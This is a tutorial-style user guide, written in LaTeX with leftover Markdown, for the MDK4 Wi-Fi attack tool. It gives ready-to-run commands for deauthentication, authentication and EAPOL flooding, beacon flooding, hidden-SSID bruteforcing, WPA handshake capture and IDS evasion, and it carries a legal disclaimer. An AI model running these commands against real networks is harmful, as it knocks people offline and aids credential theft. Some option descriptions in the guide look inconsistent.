\documentclass[11pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{geometry}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{fancyhdr}
\usepackage{tocloft}

\geometry{margin=1in}

% Code listing settings
\lstset{
    basicstyle=\ttfamily\small,
    breaklines=true,
    backgroundcolor=\color{gray!10},
    frame=single,
    numbers=left,
    numberstyle=\tiny\color{gray},
    keywordstyle=\color{blue},
    commentstyle=\color{green!60!black},
    stringstyle=\color{red}
}

% Header and footer
\pagestyle{fancy}
\fancyhf{}
\rhead{MDK4 User Guide}
\lhead{Page \thepage}
\rfoot{\today}

% Title
\title{\Huge\textbf{MDK4 Complete User Guide}\\
\Large Wireless Security Testing Tool}
\author{Comprehensive Reference Documentation}
\date{\today}

\begin{document}

\maketitle
\newpage

\tableofcontents
\newpage

\# MDK4 Complete User Guide

\#\# Table of Contents
1. [Introduction](\#introduction)
2. [Installation](\#installation)
3. [Basic Syntax](\#basic-syntax)
4. [Attack Modes Overview](\#attack-modes-overview)
5. [Detailed Attack Mode Guide](\#detailed-attack-mode-guide)
6. [Common Options](\#common-options)
7. [Practical Examples](\#practical-examples)
8. [Legal Disclaimer](\#legal-disclaimer)
9. [Troubleshooting](\#troubleshooting)

---

\#\# Introduction

\textbf{MDK4} (Murder Death Kill 4) is a powerful wireless security testing tool designed for IEEE 802.11 protocol vulnerability assessment and penetration testing. It is the successor to MDK3 and provides enhanced capabilities for testing wireless network security.

\#\#\# Key Features
\item \textbf{Modular Design}: 9 different attack modes for comprehensive testing
\item \textbf{Dual-Band Support}: Works with both 2.4GHz and 5GHz networks
\item \textbf{Dual Interface Support}: Can use one interface for receiving and another for injecting
\item \textbf{IDS Evasion}: Supports ghosting and fragmenting techniques
\item \textbf{Cross-Platform}: Works on Linux, macOS, and other Unix-like systems
\item \textbf{Based on Aircrack-ng}: Uses the osdep library from aircrack-ng for frame injection

\#\#\# What MDK4 is Used For
\item Penetration testing of wireless networks
\item Testing wireless IDS/IPS systems
\item Demonstrating wireless vulnerabilities
\item Security research and education
\item Network hardening assessments

---

\#\# Installation

\#\#\# Prerequisites
\begin{lstlisting}[language=bash]
\# Install required dependencies
sudo apt-get update
sudo apt-get install pkg-config libnl-3-dev libnl-genl-3-dev libpcap-dev build-essential
\end{lstlisting}

\#\#\# Installing MDK4
\begin{lstlisting}[language=bash]
\# Clone the repository
git clone https://github.com/aircrack-ng/mdk4

\# Navigate to directory
cd mdk4

\# Compile
make

\# Install system-wide
sudo make install
\end{lstlisting}

\#\#\# Verify Installation
\begin{lstlisting}[language=bash]
mdk4 --help
\end{lstlisting}

---

\#\# Basic Syntax

\#\#\# Command Structure
\begin{lstlisting}[language=bash]
mdk4 <interface> <attack\_mode> [attack\_options]
\end{lstlisting}

\#\#\# Dual Interface Mode
\begin{lstlisting}[language=bash]
mdk4 <interface\_in> <interface\_out> <attack\_mode> [attack\_options]
\end{lstlisting}

\#\#\# Getting Help
\begin{lstlisting}[language=bash]
\# General help
mdk4 --help

\# Full help with all options
mdk4 --fullhelp

\# Help for specific attack mode
mdk4 --help <attack\_mode>
\end{lstlisting}

\#\#\# Preparing Your Wireless Interface
\begin{lstlisting}[language=bash]
\# Check wireless interfaces
iwconfig

\# Put interface in monitor mode
sudo airmon-ng start wlan0

\# Your interface will typically become wlan0mon or mon0
\end{lstlisting}

---

\#\# Attack Modes Overview

MDK4 has \textbf{9 attack modes}, each designated by a single letter:

| Mode | Name | Description |
|------|------|-------------|
| \textbf{b} | Beacon Flooding | Sends beacon frames to show fake APs |
| \textbf{a} | Authentication DoS | Sends authentication frames to all APs |
| \textbf{d} | Deauthentication/Disassociation | Disconnects clients from APs |
| \textbf{p} | SSID Probing | Probes APs and bruteforces hidden SSIDs |
| \textbf{e} | EAPOL Start/Logoff | Floods AP with EAPOL frames |
| \textbf{s} | Mesh Networks | Attacks IEEE 802.11s mesh networks |
| \textbf{w} | WIDS Confusion | Confuses Wireless IDS/IPS systems |
| \textbf{f} | Packet Fuzzer | Fuzzes packets to test implementations |
| \textbf{x} | PoC Testing | Tests for WiFi protocol vulnerabilities |

---

\#\# Detailed Attack Mode Guide

\#\#\# Mode b - Beacon Flooding

\textbf{Purpose}: Creates multiple fake access points to confuse clients and network scanners.

\textbf{How it Works}: Sends beacon frames that make fake APs appear in WiFi scans. Can crash network scanners and some drivers.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon b
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-n <SSID>          \# Use SSID from file (one per line)
-f <filename>      \# Read SSIDs from file
-v <filename>      \# Read SSIDs and create specific APs (advanced)
-t <filename>      \# Read SSIDs from file and create WPA/WPA2 APs
-a                 \# Use all possible characters in SSIDs
-m                 \# Use valid MAC addresses from OUI database
-c <channel>       \# Create APs on specific channel (default: random)
-s <pps>           \# Set speed in packets per second (default: 50)
-h                 \# Hop to channel where AP is spoofed
-w <encryptions>   \# Specify encryption: n=None, w=WEP, t=TKIP, a=AES
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Create random fake APs
mdk4 wlan0mon b -s 100

\# Create fake APs from wordlist
mdk4 wlan0mon b -f ssid\_list.txt -s 200

\# Create WPA2 fake APs on channel 6
mdk4 wlan0mon b -f ssids.txt -c 6 -w a

\# Create fake APs with valid MAC addresses
mdk4 wlan0mon b -m -s 150
\end{lstlisting}

\textbf{Use Cases}:
\item Testing how network monitoring tools handle large numbers of APs
\item Demonstrating security awareness
\item Testing WiFi scanner applications
\item Hiding legitimate networks in noise

---

\#\#\# Mode a - Authentication DoS

\textbf{Purpose}: Floods access points with authentication requests to consume resources.

\textbf{How it Works}: Sends continuous authentication frames to all detected APs, exhausting their resources and potentially causing denial of service.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon a
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-a <BSSID>         \# Target specific AP by MAC address
-m                 \# Use valid MAC addresses from OUI database
-i <filename>      \# Read target MAC addresses from file
-s <pps>           \# Set speed in packets per second
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Attack all APs in range
mdk4 wlan0mon a -s 100

\# Attack specific AP
mdk4 wlan0mon a -a 00:11:22:33:44:55

\# Attack APs from file
mdk4 wlan0mon a -i targets.txt -s 200
\end{lstlisting}

\textbf{Use Cases}:
\item Testing AP resilience against authentication floods
\item Evaluating rate limiting implementations
\item Testing failover mechanisms

---

\#\#\# Mode d - Deauthentication/Disassociation

\textbf{Purpose}: Disconnect clients from access points.

\textbf{How it Works}: Sends deauthentication and disassociation packets to clients, forcing them to disconnect from the AP. Works by monitoring data traffic and targeting active connections.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon d
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-w <filename>      \# Whitelist of MAC addresses (BSSID, Client) to NOT attack
-b <filename>      \# Blacklist of MAC addresses to specifically attack
-s <pps>           \# Set speed in packets per second
-c <channel>       \# Focus on specific channel
-E <ESSID>         \# Target specific network by name
-B <BSSID>         \# Target specific AP by MAC address
-S <MAC>           \# Target specific client station
-W                 \# Disable 802.11w protection features
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Deauth all clients on all APs
mdk4 wlan0mon d

\# Deauth clients on specific AP
mdk4 wlan0mon d -B 00:11:22:33:44:55

\# Deauth clients on specific network name
mdk4 wlan0mon d -E "TargetNetwork"

\# Deauth specific client from any AP
mdk4 wlan0mon d -S AA:BB:CC:DD:EE:FF

\# Deauth with whitelist (protect certain devices)
mdk4 wlan0mon d -w whitelist.txt

\# Deauth on specific channel at high speed
mdk4 wlan0mon d -c 6 -s 100
\end{lstlisting}

\textbf{File Format for Whitelist/Blacklist}:
\begin{lstlisting}
\# Format: One MAC address per line
00:11:22:33:44:55
AA:BB:CC:DD:EE:FF
\end{lstlisting}

\textbf{Use Cases}:
\item Testing client reconnection behavior
\item Capturing WPA handshakes for auditing
\item Testing 802.11w (Management Frame Protection)
\item Evaluating network resilience

---

\#\#\# Mode p - SSID Probing

\textbf{Purpose}: Probe for hidden SSIDs and test AP responses.

\textbf{How it Works}: Sends probe requests to discover hidden networks and test if APs are in range. Can bruteforce hidden SSIDs using wordlists.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon p
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-e <SSID>          \# Target specific SSID
-f <filename>      \# Read SSIDs from file for bruteforcing
-t <MAC>           \# Target specific AP by BSSID
-s <pps>           \# Set speed in packets per second
-b <character\_set> \# Use custom character set for bruteforce
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Probe for hidden networks with wordlist
mdk4 wlan0mon p -f common\_ssids.txt

\# Probe specific AP
mdk4 wlan0mon p -t 00:11:22:33:44:55

\# Test if specific SSID exists
mdk4 wlan0mon p -e "HiddenNetwork"

\# High-speed probing
mdk4 wlan0mon p -f wordlist.txt -s 300
\end{lstlisting}

\textbf{Use Cases}:
\item Discovering hidden networks
\item Testing probe request handling
\item Verifying SSID cloaking implementations
\item Network reconnaissance

---

\#\#\# Mode e - EAPOL Start/Logoff Packet Injection

\textbf{Purpose}: Attack WPA/WPA2 authentication process.

\textbf{How it Works}: Floods APs with EAPOL Start frames to exhaust resources, or sends EAPOL Logoff messages to disconnect authenticated clients.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon e
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-t <BSSID>         \# Target specific AP
-s <pps>           \# Set packet speed
-l                 \# Use EAPOL Logoff instead of Start
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Flood AP with EAPOL Start frames
mdk4 wlan0mon e -t 00:11:22:33:44:55

\# Send EAPOL Logoff to disconnect clients
mdk4 wlan0mon e -t 00:11:22:33:44:55 -l

\# High-speed EAPOL flood
mdk4 wlan0mon e -s 200
\end{lstlisting}

\textbf{Use Cases}:
\item Testing WPA/WPA2 authentication resilience
\item Evaluating rate limiting
\item Testing EAPOL handling

---

\#\#\# Mode s - Mesh Network Attacks

\textbf{Purpose}: Attack IEEE 802.11s mesh networks.

\textbf{How it Works}: Exploits mesh network protocols by flooding neighbors and routes, creating black holes, or diverting traffic.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon s
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-f <type>          \# Attack type: n=neighbor flooding, r=route flooding
-b <BSSID>         \# Target specific mesh node
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Flood mesh neighbors
mdk4 wlan0mon s -f n

\# Flood mesh routes
mdk4 wlan0mon s -f r

\# Target specific mesh node
mdk4 wlan0mon s -b 00:11:22:33:44:55
\end{lstlisting}

\textbf{Use Cases}:
\item Testing mesh network security
\item Evaluating routing protocol resilience
\item Research on mesh vulnerabilities

---

\#\#\# Mode w - WIDS/WIPS Confusion

\textbf{Purpose}: Confuse and abuse Wireless Intrusion Detection/Prevention Systems.

\textbf{How it Works}: Cross-connects clients to multiple WDS nodes or creates fake rogue APs to trigger false positives in security systems.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon w
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-z                 \# Activate Zero\_Chaos' WIDS exploit
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Confuse WIDS systems
mdk4 wlan0mon w

\# Use WIDS exploit
mdk4 wlan0mon w -z
\end{lstlisting}

\textbf{Use Cases}:
\item Testing WIDS/WIPS effectiveness
\item Evaluating false positive rates
\item Security system validation

---

\#\#\# Mode f - Packet Fuzzer

\textbf{Purpose}: Test WiFi implementations with malformed packets.

\textbf{How it Works}: Creates and injects fuzzy/malformed packets to test how devices handle invalid or unexpected data.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon f
\end{lstlisting}

\textbf{Common Options}:
\begin{lstlisting}[language=bash]
-s <pps>           \# Set packet speed
-t <BSSID>         \# Target specific MAC
-m <mode>          \# Fuzzing mode
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Basic fuzzing
mdk4 wlan0mon f

\# Fuzz specific target
mdk4 wlan0mon f -t 00:11:22:33:44:55

\# High-speed fuzzing
mdk4 wlan0mon f -s 500
\end{lstlisting}

\textbf{Use Cases}:
\item Finding implementation bugs
\item Testing driver stability
\item Security research
\item Vulnerability discovery

---

\#\#\# Mode x - PoC WiFi Protocol Vulnerabilities

\textbf{Purpose}: Test for known WiFi protocol implementation vulnerabilities.

\textbf{How it Works}: Executes proof-of-concept attacks for various WiFi vulnerabilities to test if devices are affected.

\textbf{Basic Usage}:
\begin{lstlisting}[language=bash]
mdk4 wlan0mon x
\end{lstlisting}

\textbf{Examples}:
\begin{lstlisting}[language=bash]
\# Run vulnerability tests
mdk4 wlan0mon x
\end{lstlisting}

\textbf{Use Cases}:
\item Testing for known CVEs
\item Vulnerability assessment
\item Patch verification
\item Security auditing

---

\#\# Common Options

\#\#\# General Options (Available for Most Modes)

\begin{lstlisting}[language=bash]
-h                 \# Show help for specific mode
-c <channel>       \# Set specific channel (1-14 for 2.4GHz, 36+ for 5GHz)
-s <pps>           \# Packets per second (speed)
-m                 \# Use valid MAC addresses from IEEE OUI database
-v                 \# Verbose mode (show more details)
\end{lstlisting}

\#\#\# Advanced Options

\begin{lstlisting}[language=bash]
-g                 \# Enable ghosting (IDS evasion)
-p                 \# Enable fragmenting (IDS evasion)
\end{lstlisting}

---

\#\# Practical Examples

\#\#\# Example 1: Capture WPA Handshake
\begin{lstlisting}[language=bash]
\# Terminal 1: Deauth to force handshake
mdk4 wlan0mon d -E "TargetNetwork" -c 6

\# Terminal 2: Capture with airodump-ng
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
\end{lstlisting}

\#\#\# Example 2: Test Network Scanner
\begin{lstlisting}[language=bash]
\# Create 100 fake APs to test scanner performance
mdk4 wlan0mon b -s 100 -m
\end{lstlisting}

\#\#\# Example 3: Test WIDS System
\begin{lstlisting}[language=bash]
\# Generate activity to test WIDS detection
mdk4 wlan0mon w
\end{lstlisting}

\#\#\# Example 4: Discover Hidden Network
\begin{lstlisting}[language=bash]
\# Create wordlist
cat > ssids.txt << EOF
HiddenNetwork
SecretWiFi
GuestNetwork
EOF

\# Probe for hidden SSIDs
mdk4 wlan0mon p -f ssids.txt
\end{lstlisting}

\#\#\# Example 5: Test 802.11w Protection
\begin{lstlisting}[language=bash]
\# Try to deauth clients (should fail if 802.11w enabled)
mdk4 wlan0mon d -B 00:11:22:33:44:55

\# Disable 802.11w protection in attack
mdk4 wlan0mon d -B 00:11:22:33:44:55 -W
\end{lstlisting}

\#\#\# Example 6: Channel Hopping Beacon Flood
\begin{lstlisting}[language=bash]
\# Create fake APs that hop channels
mdk4 wlan0mon b -h -f ssids.txt
\end{lstlisting}

\#\#\# Example 7: Targeted Client Disconnection
\begin{lstlisting}[language=bash]
\# Disconnect only specific client
mdk4 wlan0mon d -S AA:BB:CC:DD:EE:FF -B 00:11:22:33:44:55
\end{lstlisting}

---

\#\# Legal Disclaimer

⚠️ \textbf{IMPORTANT LEGAL NOTICE} ⚠️

\#\#\# Authorization Required
MDK4 is a powerful tool that can disrupt wireless networks. \textbf{You MUST have explicit written permission} from the network owner before conducting any tests.

\#\#\# Legal Consequences
Unauthorized use of MDK4 can result in:
\item \textbf{Criminal charges} under Computer Fraud and Abuse Act (CFAA) or equivalent laws
\item \textbf{Heavy fines} (potentially hundreds of thousands of dollars)
\item \textbf{Imprisonment} (up to 10+ years depending on jurisdiction)
\item \textbf{Civil lawsuits} for damages
\item \textbf{Loss of security certifications}

\#\#\# Acceptable Use
MDK4 should ONLY be used for:
\item ✅ Testing YOUR OWN networks
\item ✅ Authorized penetration testing engagements (with written contracts)
\item ✅ Security research in controlled lab environments
\item ✅ Educational purposes on isolated test networks
\item ✅ CTF (Capture The Flag) competitions
\item ✅ Professional security assessments with proper authorization

\#\#\# Unacceptable Use
\item ❌ Attacking networks without permission
\item ❌ Disrupting public WiFi
\item ❌ Interfering with business operations
\item ❌ Attacking infrastructure (airports, hospitals, etc.)
\item ❌ "Testing" neighbor's WiFi
\item ❌ Any malicious or harmful activities

\#\#\# Best Practices
1. \textbf{Get Written Permission}: Always obtain signed authorization before testing
2. \textbf{Define Scope}: Clearly document what networks and times are authorized
3. \textbf{Document Everything}: Keep detailed logs of all testing activities
4. \textbf{Use Isolated Environments}: Test on dedicated equipment when possible
5. \textbf{Follow Responsible Disclosure}: Report vulnerabilities properly
6. \textbf{Stay Updated on Laws}: Wireless laws vary by country and region

\#\#\# Disclaimer
The authors and distributors of MDK4 are not responsible for any misuse of this tool. \textbf{You are solely responsible} for your actions and any consequences.

---

\#\# Troubleshooting

\#\#\# Issue: "No wireless extensions" or interface not found
\textbf{Solution}:
\begin{lstlisting}[language=bash]
\# Check if interface exists
iwconfig

\# Make sure interface is in monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
\end{lstlisting}

\#\#\# Issue: Packets not being injected
\textbf{Solution}:
\begin{lstlisting}[language=bash]
\# Test injection capability
sudo aireplay-ng --test wlan0mon

\# Some chipsets don't support injection
\# Check if your adapter supports injection: https://www.aircrack-ng.org/doku.php?id=compatibility\_drivers
\end{lstlisting}

\#\#\# Issue: Operation not permitted
\textbf{Solution}:
\begin{lstlisting}[language=bash]
\# Run with sudo
sudo mdk4 wlan0mon d
\end{lstlisting}

\#\#\# Issue: Channel hopping not working
\textbf{Solution}:
\begin{lstlisting}[language=bash]
\# Stop processes that might interfere
sudo airmon-ng check kill

\# Manually set channel if needed
sudo iwconfig wlan0mon channel 6
\end{lstlisting}

\#\#\# Issue: Low packet injection rate
\textbf{Solution}:
\begin{lstlisting}[language=bash]
\# Increase packet speed
mdk4 wlan0mon b -s 200

\# Check CPU usage - may be hardware limited
\# Use better wireless adapter with higher injection rates
\end{lstlisting}

\#\#\# Issue: WIDS detecting attacks immediately
\textbf{Solution}:
\begin{lstlisting}[language=bash]
\# Use IDS evasion techniques
mdk4 wlan0mon d -g      \# Enable ghosting
mdk4 wlan0mon d -p      \# Enable fragmenting
mdk4 wlan0mon d -g -p   \# Use both
\end{lstlisting}

\#\#\# Recommended Wireless Adapters for MDK4
\item \textbf{Alfa AWUS036ACH} (Dual-band, excellent injection)
\item \textbf{Alfa AWUS036NHA} (2.4GHz, reliable)
\item \textbf{TP-Link TL-WN722N v1} (Budget option, 2.4GHz only)
\item \textbf{Panda PAU09} (Good compatibility)
\item \textbf{Alfa AWUS1900} (High power, dual-band)

\textbf{Note}: v2 and later versions of some adapters (like TL-WN722N) may NOT support injection. Always verify chipset.

---

\#\# Additional Resources

\#\#\# Official Documentation
\item GitHub Repository: https://github.com/aircrack-ng/mdk4
\item Aircrack-ng Suite: https://www.aircrack-ng.org/

\#\#\# Related Tools
\item \textbf{Aircrack-ng}: WiFi security auditing suite
\item \textbf{Airodump-ng}: Packet capture and analysis
\item \textbf{Aireplay-ng}: Packet injection
\item \textbf{Wireshark}: Network protocol analyzer
\item \textbf{Kismet}: Wireless network detector

\#\#\# Learning Resources
\item Kali Linux Tools Documentation
\item WiFi pentesting courses
\item OSWP (Offensive Security Wireless Professional) certification
\item Wireless security research papers

\#\#\# Chipset Information
Check if your wireless adapter supports injection:
\item https://www.aircrack-ng.org/doku.php?id=compatibility\_drivers

---

\#\# Quick Reference Card

\begin{lstlisting}
ATTACK MODES:
b - Beacon Flooding          Create fake APs
a - Authentication DoS       Flood with auth requests
d - Deauthentication        Disconnect clients
p - SSID Probing            Find hidden networks
e - EAPOL                   Attack WPA auth
s - Mesh Networks           Attack 802.11s mesh
w - WIDS Confusion          Confuse IDS/IPS
f - Packet Fuzzer           Fuzz packets
x - PoC Testing             Test vulnerabilities

COMMON OPTIONS:
-c <channel>                Set channel
-s <pps>                    Set speed
-m                          Use valid MACs
-h                          Mode-specific help

ESSENTIAL COMMANDS:
airmon-ng start wlan0       Enable monitor mode
iwconfig                    Check interfaces
mdk4 --help <mode>          Get mode help
mdk4 --fullhelp             Full help
\end{lstlisting}

---

\#\# Conclusion

MDK4 is an essential tool for wireless security professionals, offering comprehensive capabilities for testing WiFi networks. Always use it responsibly and legally.

\textbf{Remember}:
\item Always get authorization
\item Document your testing
\item Follow ethical guidelines
\item Use for defensive purposes
\item Stay within the law

---

\textbf{Document Version}: 1.0
\textbf{Last Updated}: November 2025
\textbf{MDK4 Version}: 4.x
\textbf{Author}: Comprehensive User Guide

---

\textit{This guide is for educational and authorized security testing purposes only.}


\end{document}